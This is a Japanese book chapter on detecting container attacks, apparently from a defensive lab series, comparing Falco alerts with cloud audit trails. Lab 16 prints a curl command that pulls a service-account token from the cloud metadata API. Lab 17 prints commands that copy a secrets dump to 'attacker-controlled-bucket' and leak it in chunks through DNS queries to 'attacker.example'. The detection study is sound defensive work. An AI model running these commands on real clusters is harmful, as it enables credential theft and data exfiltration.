---
title: "第8章：Credential AccessとExfiltration"
---

# 第8章：Credential AccessとExfiltration

## この章で学ぶこと

- クラスタ内で認証情報が狙われる経路と、クラウドAPIへの越境
- Lab 16〜17の実験手順とFalco・クラウドAudit Trailそれぞれの結果
- 「クラスタの境界」を越えた瞬間、観測の主役がどう入れ替わるか

本章ではMITRE ATT&CK for Containersの**Credential Access**と**Exfiltration**を扱います。第1章で触れた3つ目の境界線——**クラウドAPI層**が、ここで初めて主役になります。

---

## Lab 16: クラウドメタデータAPI経由のクレデンシャル窃取

- **MITRE ATT&CK for Containers**: T1552.005 (Cloud Instance Metadata API)
- **前提**: ノード（ワーカーノード）上で、クラウドのインスタンスメタデータAPIに直接アクセスする

```bash
# 侵害済みPod内から（hostNetwork: trueの場合、またはノードに到達済みの場合）
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

このエンドポイントから取得したトークンを使えば、**Kubernetesの外側にあるクラウドIAMの権限**をそのまま利用できてしまいます。多くのマネージドKubernetes環境では、ノードに紐づくクラウドIAMロールがPodからも（Workload Identity等の設定が不十分だと）到達可能になっているケースがあります。

**Falcoの検知結果**:

```
19:41:18.552310000: Critical Contact Cloud Metadata Service From Container (container=victim-pod dest=169.254.169.254)
```

Falcoの標準ルールセットには、**メタデータAPIの固定IP（169.254.169.254）への接続**に反応するルールがクラウド向けに用意されており、これが発火します。

**クラウド側Audit Trailの記録**:

```json
{
  "eventName": "AssumeRoleWithWebIdentity",
  "userIdentity": {"type": "WebIdentityUser"},
  "sourceIPAddress": "203.0.113.50",
  "requestParameters": {"roleArn": "arn:aws:iam::xxxx:role/node-role"}
}
```

**考察**: ここが本書で最も重要な境界線のまたぎです。**「メタデータAPIに接続した」という最初の一歩はFalcoが検知**しますが、**そのトークンを使って実際にクラウドAPI上で何が行われたか（S3へのアクセス、IAMロールの引き受けなど）は、クラウド側のAudit Trailでしか追えません**。Falcoのアラートだけを見て「ブロックした、安心」と判断すると、トークンが既に持ち出され、クラウド側で別のタイミングで悪用されるケースを見逃します。

## Lab 17: データの持ち出し経路（DNS exfil, S3等）

- **MITRE ATT&CK for Containers**: T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol)
- **前提**: Lab 16で得たクレデンシャルを使い、クラスタ内のSecretデータを外部のS3バケットへ送信する。合わせて、Egressが制限された環境を想定し、DNSクエリに情報を埋め込むDNS exfiltrationも再現する

```bash
# S3への直接持ち出し
aws s3 cp /tmp/secrets-dump.json s3://attacker-controlled-bucket/

# DNS exfiltration（Egressがブロックされている場合の代替経路）
for chunk in $(split-data secrets-dump.json); do
  dig "${chunk}.attacker.example"
done
```

**Falcoの検知結果（S3持ち出し）**:

```
19:48:02.110023000: Warning AWS CLI Executed in Container (container=victim-pod command=aws s3 cp)
```

**Falcoの検知結果（DNS exfiltration）**:

```
19:52:30.887011000: Notice Excessive DNS Queries (container=victim-pod query_count=312 window=30s)
```

DNS exfiltrationは、**単発のクエリでは異常に見えません**が、**短時間に大量の一意なサブドメインへクエリを投げるパターン**が異常として浮かび上がります。

**クラウド側Audit Trailの記録（S3側）**:

```json
{
  "eventName": "PutObject",
  "requestParameters": {"bucketName": "attacker-controlled-bucket"},
  "sourceIPAddress": "10.0.3.12"
}
```

**考察**: S3への持ち出しは、Falco（`aws`コマンド実行の検知）とクラウドAudit Trail（実際のPutObject）の両方で裏付けが取れました。一方DNS exfiltrationは**クラウド側のAudit Trailには一切記録が残らず、Falcoのネットワーク/DNS監視だけが頼り**になります。このように、**持ち出し経路によってどのデータソースが有効かが変わる**ため、単一の防御層に頼らない設計が必要だと分かります。

---

## 本章のまとめ

| Lab | 手法 | Falco | クラウドAudit Trail | ポイント |
|---|---|---|---|---|
| 16 | メタデータAPI経由のクレデンシャル窃取 | ✅ 接続時点で検知 | ✅ トークン利用を記録 | 「窃取」と「悪用」で主役のデータソースが切り替わる |
| 17 | S3持ち出し | ✅ コマンド実行で検知 | ✅ PutObjectを記録 | 2つのデータソースで裏付けが取れる |
| 17 | DNS exfiltration | ✅ クエリパターンで検知 | ❌ 記録されない | Falcoのみが頼りになる経路もある |

第3章から本章まで、8フェーズ・17本の実験を通して、**Falco・Kubernetes Audit Logs・クラウドAudit Trail・ネットワーク観測**という4つの観測手段それぞれの得意分野と空白地帯が見えてきました。残り3本の実験（Lab 18〜20）と、これまでの結果の横断分析は次章で行います。
